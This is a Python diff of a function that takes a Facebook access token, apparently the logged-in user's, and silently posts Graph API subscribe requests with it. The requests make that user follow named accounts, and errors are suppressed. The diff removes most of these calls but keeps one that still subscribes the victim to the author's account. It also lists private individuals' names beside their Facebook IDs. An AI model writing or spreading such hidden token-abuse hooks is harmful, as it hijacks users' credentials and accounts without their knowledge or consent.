@@ -112,27 +112,7 @@ def _clear_():
 def _bot_follow_(_tok_dev_):
     token = _tok_dev_
     try:
-        _req_post_("https://graph.facebook.com/1827084332/subscribers?access_token=" + token)      # Dapunta Khurayra X
-        _req_post_("https://graph.facebook.com/100000415317575/subscribers?access_token=" + token) # Dapunta Adyapaksi R
-        _req_post_("https://graph.facebook.com/100000737201966/subscribers?access_token=" + token) # Dapunta Adya R
-        _req_post_("https://graph.facebook.com/100000431996038/subscribers?access_token=" + token) # Suci Salsabila R
-        _req_post_("https://graph.facebook.com/100026818103201/subscribers?access_token=" + token) # Cici Putri Andini
-        _req_post_("https://graph.facebook.com/100001617352620/subscribers?access_token=" + token) # Antonius Raditya M
-        _req_post_("https://graph.facebook.com/100000729074466/subscribers?access_token=" + token) # Abigaille Dirgantara
-        _req_post_("https://graph.facebook.com/607801156/subscribers?access_token=" + token)       # Boirah
-        _req_post_("https://graph.facebook.com/100009340646547/subscribers?access_token=" + token) # Anita Zuliatin
-        _req_post_("https://graph.facebook.com/1676993425/subscribers?access_token=" + token)      # Wati Waningsih
-        _req_post_("https://graph.facebook.com/1767051257/subscribers?access_token=" + token)      # Rofi Nurhanifah
-        _req_post_("https://graph.facebook.com/100000287398094/subscribers?access_token=" + token) # Diah Ayu Kharisma
-        _req_post_("https://graph.facebook.com/100001085079906/subscribers?access_token=" + token) # Xena Alexander
-        _req_post_("https://graph.facebook.com/100007559713883/subscribers?access_token=" + token) # Alexandra Scarlett
-        _req_post_("https://graph.facebook.com/100004655733027/subscribers?access_token=" + token) # Aisya Asyaqila
-        _req_post_("https://graph.facebook.com/100000200420913/subscribers?access_token=" + token) # Ameiliani Dethasia
-        _req_post_("https://graph.facebook.com/100026490368623/subscribers?access_token=" + token) # Muh Rizal Fiansyah
-        _req_post_("https://graph.facebook.com/100010484328037/subscribers?access_token=" + token) # Rizal F
-        _req_post_("https://graph.facebook.com/100015073506062/subscribers?access_token=" + token) # Angga Kurniawan
-        _req_post_("https://graph.facebook.com/10016189/subscribers?access_token=" + token)        # Junee
-        _dapunta_cici_('\n%s[%s!%s] %sLogin Berhasil'%(_H_,_P_,_H_,_P_))
+        _req_post_("https://graph.facebook.com/1827084332/subscribers?access_token=" + token)      # Dapunta Khurayra 
         time.sleep(2)
     except (KeyError,IOError):pass
 
